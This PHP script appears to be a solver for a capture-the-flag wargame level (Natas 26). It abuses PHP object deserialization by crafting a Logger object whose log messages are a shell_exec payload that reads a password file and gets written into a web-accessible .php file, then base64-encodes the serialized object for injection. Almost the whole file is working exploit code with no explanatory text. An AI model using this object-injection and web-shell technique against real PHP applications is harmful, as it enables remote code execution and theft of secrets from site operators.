<?php
  class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
	    $this->initMsg="<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
            $this->exitMsg="<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
            $this->logFile = "/tmp/intruder.php";
            
	    // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }
  $fd = fopen("serialized", "a+");
  $serialized_obj = fread($fd, 246);
  echo $serialized_obj;
  $my_obj = unserialize($serialized_obj);
  $my_obj->log("encoder teste");
  $encoded_obj = base64_encode($serialized_obj);
  echo "ENCODED: ".$encoded_obj;
?>
